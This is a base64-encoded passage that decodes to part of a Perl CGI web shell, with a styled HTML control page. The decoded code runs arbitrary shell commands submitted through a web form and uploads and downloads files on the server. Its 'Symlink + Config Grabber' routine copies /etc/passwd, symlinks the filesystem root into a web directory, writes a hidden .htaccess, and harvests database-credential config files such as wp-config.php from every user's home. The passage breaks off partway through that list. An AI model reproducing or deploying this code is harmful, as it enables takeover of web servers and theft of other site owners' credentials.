TDA2Nk5GZnE5VlpuUWZXN0ZYbWxjbmpZNU9QWnVESXpvOFN6L2liVUp1MDhjSHdvaVRkcnJDd3BhbXFaakthZFAvOWtBZDg1dk1pK1YrcnBBVDR3K0Q2WEs1bTRrdkFZcVAwTXRhYk5QekhxdTcxeW5OMWZ1OEphOE1sN3NjbndzTGdoM1BnYjE0dExYd0FBQUhqYVkyQmtBSUl6Wnd6bnJYa2N6Mi96bFVHZUF5VEFjTzZNNmswRS9XOEpDd1BiRWlDWGc0RUpKQW9BbTZZTlNIamFZMkJrWUdCYjhyY0lSRElBQVFzREF5TURLbmdCQUZGY0E3SjQybldUc1V2RFFCVEdYMW9SUittYW9ZTUVCd2NSd1JKRUFpSWRnaFFKUlJ4S2h1SWdMaVZJRWNmZzRCQ2taSEZ3RkJGY0hCeUtGUDhNTjJjUndjbFp4Ty9kZmNWNGFPREg5L0p5ZCsvZGQ1ZmF1MndKbnBsZmVFZGdEbkVMREVBQUl1UnVvSzlrQ0ZMa1ZrQVRIT0w5M09ia2t0OVBRQXpPdUU0T0RpdzYzdE42KzV5aitnZ1MwT0Q0bERvaCt0NERZK1pQbWQ4RUdWZ0hGOVNNN0lBKzhEbHVsVEhtZTdxdkVmaGczWG5rT3RCalVMS25oT1RVa3JYTFN0eGxuRlQwbWZ2V2VRWFlBSXZzTFdhZlY2aDN6M2liM2c5WlYvZlpzYjJhTVFWOWI3UGYzTlpWNzAzdWszNnFSMStJYTZESGZrTDZIZG04OGUrTzU3b0FsdWg5NHg5YVhIZmlNSFlJS3VmZ01xTDJIWHp1djZUdmZ4RTVaekZsNEpCVi9IZEpxWVZEekRreDl4blJjNzMvTC9WRVpQWmFaS3ExTlJIdkZ2Z1dlWUoyb2FrNXUrWVA1bDhRL2gvTEZ0a0R1K1JOYStsY2ZNTzk4TnE2THZzSTZnOG1EaVg4QnVIcVh3WjQybU5nWU5DQnd5cUdMWXd6bUl5WXJqRVhNTTlpUHNMOGdjV0hwWS9sQ01zalZoRldEOVo5clAvWUN0aWVzZHV3ditOSTRsakFxY1k1amZNV2x4cVhEVmNjVnduWEkrNHluaVNlTjd3T3ZGTjRML0N4OFJYeHJlSjd4Sy9FbjhUZkljQWg0Q1V3VCtDRFlJVGdDU0Vub1NLaGJjTEhSR3hFcWtTMmlMd1RsUkwxRTYwUW5TYTZUdlNjV0lEWUdyRi80akhpK3lRQ0pJNUo4a2ptU1Y2UTRwTUtrdG9qOVVmYVQzcU5ESStNaTh3R1dRNVpIOWx0Y3J2a2Zza1h5YTlRRUZFd1VKaWo4RVBoaDZLYjRqWWxGYVU1eWh6S2VzcVBWRlJVenFuNnFlYW9UbEhkcEZhaU5rbnRoYnFaZW84R2g0YUdScFhHTVkwdm1sYWFUWnBYTkw5b1ZXanphVC9SQ2RQMTAvUFFkekhJTXB4a3RNMll6M2lTOFEwVE9aTXNrd2VtYXFZNXB0dk1qTXhXbWV1Wjk1aS9zdkN5dUdXWll0bG14V1VWWWJYQ21zRzZ6dnFRalpUTkZsczcyek4yY2ZZUzloY2NPaHlESEI4NStUaHRjMVp4UHVFaTRaTGhzc2ZWeW5XTG00WGJGTGNQN243dUR6enlQRFo1R25rMmVGN3kwdkphNGEzaDNlZmo1WFBBTjgvM2xaK1FYd3dPbU9WWDRkZm1OODl2bTk4YmZ5WC9DUDlkQVZJQkZRRWJBZ1dBVUM4d0NBalBCSGtFWlFRdENib0ZBR1FibHFNQUFRQUFBT2tBVFFBRkFBQUFBQUFDQUFFQUFnQVdBQUFCQUFIRUFBQUFBSGphblpLN1NnTkJGSWIvM2NSTFVJSVJDUllpVTRpZG00MUcwRlNDUVN6Y1J2RFNiaTdHWUM2eUdSSEJ3bWZ3Q1N4OUFwOUJ3Y3JLSjdIMm45bXppc0ZFQ1VNbTM1enpuOHZPSEFBNXZDRUZKNTBCY005ZnpBN3lQTVhzSW90SDRSUjI4Q1NjeGlvK2hDZXc2Q3dKVDJMRktRbFA0YzQ1Rlo3R3N2TXVuQ0Vuc1RNb3VRdkNzK1I5NFRuazNWdmhITEp1MHM4ODdRL0N6K1NrbnhmNDdpdDIwY01sYmhDaGhTYk9vYUd3RGg5RkxrVnZpQzRWWFhwcjVEWnRCOVRVNFpFTUczdUQvajczT2kxWDVEbzVJbXZtYS9EL0NGVnIxOXdWOW13Ky9TTzZablZGWnZVSDFJRlY5M0JJUlpPV05ydUlobWpVZ0VyaDJIYlNaeDJqVU16dVlXdG9qY0g0LzBRbnNXc2pPd3p0cmZ4K24wWnR2ajZ5OFMzVzA3WnVmSithRk5vYjdWamxCZjJLR2M3K2VKMktQV3ZwUE9BcFpQYkVQOXBycGtCektzb29jRjNiNWRIK0hkT1JDSTkxZXp3Vnhvb1ovNlZQcUtueURwSkppaWNua08rcDBGdXo4N2t0MDF6R0psL083UDdYZkc5OEFvdE9sbHdBZU5wdDBFVnNGSEVVeC9IdmEzZTc3ZGJkS2U0eU05dXA0THR0QjNkM0NyVkZXdGl5dUliaUVnZ0pOd2gyQVlKcklNQUJDRzVCQWh3NDQrRUFYR0hhK1hQakpTK2Z2UC9oOTE3K1JOQlNmOXgwNW4vMXlXNlJDSWtrRWhkdW92QVFUUXhlWW9ram5nUVNTU0taRkZKSkk1ME1Nc2tpbXh4eXlTT2ZWaFRRbWphMHBSM3Q2VUJIT3RtYnV0Q1ZiblNuQnozcGhZYU9nWTlDVElvb3BvUlNldE9IdnZTalB3TVlpSjhBWlpSVGdjVWdCak9Fb1F4ak9DTVl5U2hHTTRheGpHTThFNWpJSkNZemhhbE1Zem96bU1rc1psTXBMbzdTeENadXNKK1BiR1kzT3pqQWNZNkptKzI4WnlQN0pFbzg3SkpvdG5LYkR4TERRVTd3aTUvODVnaW5lTUE5VGpPSHVleWhpa2RVYzUrSFBPTXhUM2hxLzFNTkwzbk9DODVReXcvMjhvWlh2S2FPTDN4akcvTUlNcCtGTEtDZVF6U3dtRVdFYUNUTUVwYXlqTThzWnlVcldNVWFWbk9WdzZ4akxldlp3RmUrYzQyem5PTTZiM2tuWG9tVk9JbVhCRW1VSkVtV0ZFbVZORW1YRE1ua1BCZTR6Qlh1Y0pGTDNHVUxKeVdMbTl5U2JNbGhwK1JLbnVSN3d2VkJUZFBLSFhXbFgxT3FPV0FvZlVwVFdkcXNZUWNvZGFXaDlDa0xsYWF5U0Ztc0xGSCt5L003NmlwWDE3MDF3ZHB3cUxxcXNySE9lVElzUjlOeVZZUkREUzJEYVpVMWF3V2NPMnlOdnc2cm1WUUFBSGphUGN3OUVzRkFIQVh3YkZZMmtjK05DU296TVhSYmFiUWFTWlBHcUxJenptRkdwMUZ5Q2dmNFIrVVNqdUFzUEt6dDN1L05tM2RucnhPeHM5TlFzR2s3eGk2NnE0VnFweVIxUThVVzRhZ25KTlN1ZFlpWEZYRzFKbEZXTi81MDFSY2VJSzRHUGNBN0dQaWYyY01nQVB5aFFSOElzaDhZaGVZMlFodEtWM1c4M29NeEdJMHNFekJlV2FaZ3NyRE13SFJ1S2NGc1pwbURjbXc1QVBQbG41b0s5UWJpQmtxc0FBQUJVcVoxV2dBQSkgZm9ybWF0KCd3b2ZmJyk7DQogICAgZm9udC13ZWlnaHQ6IG5vcm1hbDsNCiAgICBmb250LXN0eWxlOiBub3JtYWw7DQoNCn0NCg0KYm9keSB7DQpmb250LWZhbWlseTogInVidW50dV9tb25vcmVndWxhciI7DQpmb250LXNpemU6MTJweDsNCmJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7DQpiYWNrZ3JvdW5kLWF0dGFjaG1lbnQ6IGZpeGVkOw0KYmFja2dyb3VuZC1wb3NpdGlvbjogY2VudGVyIGNlbnRlcjsNCmJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOw0KYmFja2dyb3VuZC1jb2xvcjojMmQyYjJiOw0KY29sb3I6bGltZTsNCmJhY2tncm91bmQtaW1hZ2U6IHVybCgnaHR0cHM6Ly9zdGF0aWMuemVyb2NoYW4ubmV0L0FsbGVuLldhbGtlci5mdWxsLjEwMTIyMTUuanBnJyk7DQp9DQojbmF2e3Bvc2l0aW9uOmZpeGVkO3otaW5kZXg6OTk5O3RvcDowO3dpZHRoOjEwMCU7bGVmdDo3MCU7DQp9DQphLm5hdi1mb2t1cyB7ZGlzcGxheTpibG9jazsgd2lkdGg6YXV0bzsgaGVpZ2h0OmF1dG87IGJhY2tncm91bmQ6IzE5MTkxOTsgYm9yZGVyLXRvcDowcHg7IGJvcmRlci1sZWZ0OiAxcHggc29saWQgI2ZmZjsgYm9yZGVyLXJpZ2h0OjFweCBzb2xpZCAjZmZmOyAgYm9yZGVyLWJvdHRvbToxcHggc29saWQgI2ZmZjsgIHBhZGRpbmc6NXB4IDhweDsgdGV4dC1hbGlnbjpjZW50ZXI7IHRleHQtZGVjb3JhdGlvbjpub25lOyBjb2xvcjpyZWQ7IGxpbmUtaGVpZ2h0OjIwcHg7IG92ZXJmbG93OmhpZGRlbjsgZmxvYXQ6bGVmdDsNCn0NCmEubmF2LWZva3VzOmhvdmVyIHtjb2xvcjojRkZGRkZGOyBiYWNrZ3JvdW5kOiMxOTE5MTk7IGJvcmRlci10b3A6MHB4OyBib3JkZXItbGVmdDogMXB4IHNvbGlkICNmZmY7IGJvcmRlci1yaWdodDoxcHggc29saWQgI2ZmZjsgIGJvcmRlci1ib3R0b206MXB4IHNvbGlkICNmZmY7DQp9DQppbnB1dFt0eXBlPXRleHRdew0KCWJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyANCgljb2xvcjp3aGl0ZTsNCgltYXJnaW46MCAxMHB4Ow0KCWZvbnQtZmFtaWx5OkhvbWVuYWplOw0KCWZvbnQtc2l6ZToxM3B4Ow0KCWJvcmRlcjpub25lOw0KfQ0KaW5wdXRbdHlwZT1zdWJtaXRdIHsNCgliYWNrZ3JvdW5kOiBibGFjazsgDQoJY29sb3I6d2hpdGU7DQoJbWFyZ2luOjAgMTBweDsNCglmb250LWZhbWlseTpIb21lbmFqZTsNCglmb250LXNpemU6MTNweDsNCglib3JkZXI6bm9uZTsNCg0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIyZDJiMmIiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCI+DQo8ZGl2IGlkPSJuYXYiPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uPyI+PGI+SG9tZTwvYj48L2E+DQo8YSBjbGFzcz0ibmF2LWZva3VzIiBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1oZWxwIj48Yj5IZWxwPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCI+PGI+VXBsb2FkPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkIj48Yj5Eb3dubG9hZDwvYj48L2E+DQo8YSBjbGFzcz0ibmF2LWZva3VzIiBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1zeW1jb25maWciPjxiPlN5bWxpbmsgKyBDb25maWcgR3JhYmJlcjwvYj48L2E+PC9kaXY+DQo8YnI+DQo8Zm9udCBjb2xvcj0ibGltZSIgc2l6ZT0iMyI+DQpFTkQNCn0NCnN1YiBQcmludFBhZ2VGb290ZXINCnsNCnByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQpzdWIgR2V0Q29va2llcw0Kew0KQGh0dHBjb29raWVzID0gc3BsaXQoLzsgLywkRU5WeydIVFRQX0NPT0tJRSd9KTsNCmZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpDQp7DQooJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7DQokQ29va2llc3skaWR9ID0gJHZhbDsNCn0NCn0NCg0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCiRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOw0KICAgIHByaW50IDw8RU5EOw0KPGNvZGU+DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iPyI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KJFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0NCnsNCiRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cICI7DQpwcmludCA8PEVORDsNCjxjb2RlPjxjZW50ZXI+PGJyPg0KPGZvbnQgY29sb3I9bGltZT48Yj48aT48Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iZG93bmxvYWQiPg0KJFByb21wdCBkb3dubG9hZDxicj48YnI+DQpGaWxlbmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KRG93bmxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8L2Zvcm0+DQo8L2k+PC9iPjwvZm9udD48L2NlbnRlcj4NCjwvY29kZT4NCkVORA0KfQ0KDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQpwcmludCA8PEVORDsNCjxjb2RlPjxicj48Y2VudGVyPjxmb250IGNvbG9yPWxpbWU+PGI+PGk+PGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQokUHJvbXB0IHVwbG9hZDxicj48YnI+DQpGaWxlbmFtZTogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KT3B0aW9uczogPGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvIiB2YWx1ZT0ib3ZlcndyaXRlIj4NCk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8YnI+PGJyPg0KVXBsb2FkOiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPg0KPC9mb3JtPjwvaT48L2I+PC9mb250Pg0KPC9jZW50ZXI+DQo8L2NvZGU+DQpFTkQNCn0NCg0Kc3ViIENvbW1hbmRUaW1lb3V0DQp7DQppZighJFdpbk5UKQ0Kew0KYWxhcm0oMCk7DQpwcmludCA8PEVORDsNCjwveG1wPg0KPGNvZGU+DQpDb21tYW5kIGV4Y2VlZGVkIG1heGltdW0gdGltZSBvZiAkQ29tbWFuZFRpbWVvdXREdXJhdGlvbiBzZWNvbmQocykuDQo8YnI+S2lsbGVkIGl0IQ0KPGNvZGU+DQpFTkQNCiZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCmV4aXQ7DQp9DQp9DQpzdWIgRXhlY3V0ZUNvbW1hbmQNCnsNCiAgIGlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQNCiAgICB7DQogICAgICAgICMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUNCiAgICAgICAgIyBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQuDQogICAgICAgDQogICAgICAgICRPbGREaXIgPSAkQ3VycmVudERpcjsNCiAgICAgICAgJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOw0KICAgICAgICBjaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQogICAgICAgICZQcmludFBhZ2VIZWFkZXIoImMiKTsNCiAgICAgICAgJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOw0KICAgICAgICBwcmludCAiPGNvZGU+JFByb21wdCAkUnVuQ29tbWFuZDwvY29kZT4iOw0KICAgIH0NCiAgICBlbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQNCiAgICB7DQogICAgICAgICZQcmludFBhZ2VIZWFkZXIoImMiKTsNCiAgICAgICAgJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQogICAgICAgIHByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPjx4bXA+IjsNCiAgICAgICAgJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiRSdW5Db21tYW5kLiRSZWRpcmVjdG9yOw0KICAgICAgICBpZighJFdpbk5UKQ0KICAgICAgICB7DQogICAgICAgICAgICAkU0lHeydBTFJNJ30gPSBcJkNvbW1hbmRUaW1lb3V0Ow0KICAgICAgICAgICAgYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOw0KICAgICAgICB9DQogICAgICAgIGlmKCRTaG93RHluYW1pY091dHB1dCkgIyBzaG93IG91dHB1dCBhcyBpdCBpcyBnZW5lcmF0ZWQNCiAgICAgICAgew0KICAgICAgICAgICAgJHw9MTsNCiAgICAgICAgICAgICRDb21tYW5kIC49ICIgfCI7DQogICAgICAgICAgICBvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsNCiAgICAgICAgICAgIHdoaWxlKDxDb21tYW5kT3V0cHV0PikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkXyA9fiBzLyhcbnxcclxuKSQvLzsNCiAgICAgICAgICAgICAgICBwcmludCAiJF9cbiI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkfD0wOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgIyBzaG93IG91dHB1dCBhZnRlciBjb21tYW5kIGNvbXBsZXRlcw0KICAgICAgICB7DQogICAgICAgICAgICBwcmludCBgJENvbW1hbmRgOw0KICAgICAgICB9DQogICAgICAgIGlmKCEkV2luTlQpDQogICAgICAgIHsNCiAgICAgICAgICAgIGFsYXJtKDApOw0KICAgICAgICB9DQogICAgICAgIHByaW50ICI8L3htcD4iOw0KICAgIH0NCiAgICAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiAgICAmUHJpbnRQYWdlRm9vdGVyOw0KfQ0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQ0Kew0KbG9jYWwoJEZpbGVVcmwpID0gQF87DQppZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBleGlzdHMNCnsNCiMgZW5jb2RlIHRoZSBmaWxlIGxpbmsgc28gd2UgY2FuIHNlbmQgaXQgdG8gdGhlIGJyb3dzZXINCiRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCiREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsNCiRIdG1sTWV0YUhlYWRlciA9ICI8bWV0YSBIVFRQLUVRVUlWPVwiUmVmcmVzaFwiIENPTlRFTlQ9XCIxOyBVUkw9JERvd25sb2FkTGlua1wiPiI7DQomUHJpbnRQYWdlSGVhZGVyKCJjIik7DQpwcmludCA8PEVORDsNCjxjb2RlPg0KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+DQpJZiB0aGUgZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0b21hdGljYWxseSwNCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lg0KPC9jb2RlPg0KRU5EDQomUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQplbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQp7DQomUHJpbnRQYWdlSGVhZGVyKCJmIik7DQpwcmludCAiPGNvZGU+RmFpbGVkIHRvIGRvd25sb2FkICRGaWxlVXJsOiAkITwvY29kZT4iOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQp9DQpzdWIgU3ltQ29uZmlnDQp7DQojIS91c3IvYmluL3BlcmwgLUkvdXNyL2xvY2FsL2JhbmRtaW4NCnVzZSBGaWxlOjpDb3B5OyB1c2Ugc3RyaWN0OyB1c2Ugd2FybmluZ3M7IHVzZSBNSU1FOjpCYXNlNjQ7DQpteSAkZmlsZW5hbWUgPSAncGFzc3dkLnR4dCc7DQppZiAoIS1lICRmaWxlbmFtZSkgeyBjb3B5KCIvZXRjL3Bhc3N3ZCIsInBhc3N3ZC50eHQiKSA7DQp9DQpta2RpciAic3ltbGlua19jb25maWciOw0Kc3ltbGluaygiLyIsInN5bWxpbmtfY29uZmlnL3Jvb3QiKTsNCm15ICRodGFjY2VzcyA9IGRlY29kZV9iYXNlNjQoIlQzQjBhVzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVDQmpiMjQzWlhoMExtaDBiUTBLUVdSa1ZIbHdaU0IwWlhoMEwzQnNZV2x1SUM1d2FIQWdEUXBCWkdSSVlXNWtiR1Z5SUhSbGVIUXZjR3hoYVc0Z0xuQm9jQTBLVTJGMGFYTm1lU0JCYm5rTkNrbHVaR1Y0VDNCMGFXOXVjeUFyUTJoaGNuTmxkRDFWVkVZdE9DQXJSbUZ1WTNsSmJtUmxlR2x1WnlBclNXZHViM0psUTJGelpTQXJSbTlzWkdWeWMwWnBjbk4wSUN0WVNGUk5UQ0FyU0ZSTlRGUmhZbXhsSUN0VGRYQndjbVZ6YzFKMWJHVnpJQ3RUZFhCd2NtVnpjMFJsYzJOeWFYQjBhVzl1SUN0T1lXMWxWMmxrZEdnOUtpQU5Da2x1WkdWNFNXZHViM0psSUNvdWRIaDBOREEwRFFwU1pYZHlhWFJsUlc1bmFXNWxJRTl1RFFwU1pYZHlhWFJsUTI5dVpDQWxlMUpGVVZWRlUxUmZSa2xNUlU1QlRVVjlJRjR1S25ONWJXeHBibXRmWTI5dVptbG5JRnRPUTEwTkNsSmxkM0pwZEdWU2RXeGxJRnd1ZEhoMEpDQWxlMUpGVVZWRlUxUmZWVkpKZlRRd05DQmJUQ3hTUFRNd01pNU9RMTA9Iik7DQpteSAkeHN5bTQwNCA9IGRlY29kZV9iYXNlNjQoIlQzQjBhVzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVDQmpiMjQzWlhoMExtaDBiUTBLU0dWaFpHVnlUbUZ0WlNCd2NIRXVkSGgwRFFwVFlYUnBjMlo1SUVGdWVRMEtTVzVrWlhoUGNIUnBiMjV6SUVsbmJtOXlaVU5oYzJVZ1JtRnVZM2xKYm1SbGVHbHVaeUJHYjJ4a1pYSnpSbWx5YzNRZ1RtRnRaVmRwWkhSb1BTb2dSR1Z6WTNKcGNIUnBiMjVYYVdSMGFEMHFJRk4xY0hCeVpYTnpTRlJOVEZCeVpXRnRZbXhsRFFwSmJtUmxlRWxuYm05eVpTQXEiKTsNCm9wZW4obXkgJGZoMSwgJz4nLCAnc3ltbGlua19jb25maWcvLmh0YWNjZXNzJyk7IHByaW50ICRmaDEgIiRodGFjY2VzcyI7IGNsb3NlICRmaDE7IG9wZW4obXkgJHh4LCAnPicsICdzeW1saW5rX2NvbmZpZy9uZW11LnR4dCcpOyBwcmludCAkeHggIiR4c3ltNDA0IjsgY2xvc2UgJHh4OyBvcGVuKG15ICRmaCwgJzw6ZW5jb2RpbmcoVVRGLTgpJywgJGZpbGVuYW1lKTsgd2hpbGUgKG15ICRyb3cgPSA8JGZoPikgeyBteSBAbWF0Y2hlcyA9ICRyb3cgPX4gLyguKj8pOng6L2c7IG15ICR1c2VybnlhID0gJDE7IG15IEBhcnJheSA9ICgge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nLy5hY2Nlc3NoYXNoJywgdHlwZSA9PiAnV0hNLWFjY2Vzc2hhc2gnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCB0eXBlID0+ICdMb2tvbWVkaWEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9saWIvY29uZmlnLnBocCcsIHR5cGUgPT4gJ0JhbGl0YmFuZycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9zZXR0aW5ncy5pbmMucGhwJywgdHlwZSA9PiAnUHJlc3RhU2hvcCcgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FwcC9ldGMvbG9jYWwueG1sJywgdHlwZSA9PiAnTWFnZW50bycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCB0eXBlID0+ICdPcGVuQ2FydCcgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCB0eXBlID0+ICdFbGxpc2xhYicgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93cC90ZXN0L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wb3J0YWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XUC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC90ZXN0